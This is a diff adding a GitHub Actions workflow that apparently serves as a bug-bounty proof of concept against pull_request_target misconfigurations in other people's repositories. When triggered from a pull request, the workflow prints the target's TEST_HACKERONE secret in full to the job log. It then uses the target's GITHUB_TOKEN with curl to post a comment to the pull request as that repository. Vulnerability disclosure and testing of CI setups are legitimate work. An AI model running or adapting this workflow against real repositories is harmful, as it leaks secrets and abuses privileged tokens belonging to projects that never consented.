@@ -1,0 +1,50 @@
+name: Prove Repository Context
+on: pull_request_target
+
+jobs:
+  prove:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Debug Repository Context
+        run: |
+          echo "=== PROVING REPOSITORY CONTEXT ==="
+          echo ""
+          echo "1. CURRENT REPOSITORY (should be THEIRS):"
+          echo "   Repository: ${{ github.repository }}"
+          echo ""
+          
+          echo "2. SECRET ACCESS TEST:"
+          echo "   TEST_HACKERONE exists: ${{ secrets.TEST_HACKERONE != '' }}"
+          
+          # Try to access the secret
+          HACKERONE_SECRET="${{ secrets.TEST_HACKERONE }}"
+          if [ -n "$HACKERONE_SECRET" ]; then
+            echo "   ✅ SECRET ACCESSIBLE: $HACKERONE_SECRET"
+            echo "   Secret length: ${#HACKERONE_SECRET} chars"
+          else
+            echo "   ❌ No TEST_HACKERONE secret found"
+          fi
+          echo ""
+          
+          echo "3. GITHUB_TOKEN PERMISSIONS TEST:"
+          echo "   This should run as THEIR repository:"
+          echo "   Event: ${{ github.event_name }}"
+          echo "   Ref: ${{ github.ref }}"
+          echo "   Base ref: ${{ github.base_ref }}"
+          echo "   Head ref: ${{ github.head_ref }}"
+          echo ""
+          
+          echo "4. PROOF - Create comment using THEIR token:"
+          # This will create a comment AS THEIR REPOSITORY
+          curl -X POST \
+            -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github.v3+json" \
+            https://api.github.com/repos/${{ github.repository }}/issues/${{ github.event.pull_request.number }}/comments \
+            -d "{\"body\": \"🚨 **PROOF OF VULNERABILITY** 🚨\\n\\nThis comment was created by THEIR GITHUB_TOKEN via pull_request_target.\\n\\nRepository: ${{ github.repository }}\\nSecret TEST_HACKERONE accessible: $([ -n \"$HACKERONE_SECRET\" ] && echo \"YES\" || echo \"NO\")\\n\\n**Vulnerability Confirmed:** Workflow runs in BASE repo context with secrets!\"}"
+          
+          echo ""
+          echo "=== CONTEXT PROVEN ==="
+          echo "If you see this comment on the PR, it proves:"
+          echo "1. Workflow runs in THEIR repository context"
+          echo "2. Their GITHUB_TOKEN has write permissions"
+          echo "3. Their secrets are accessible"
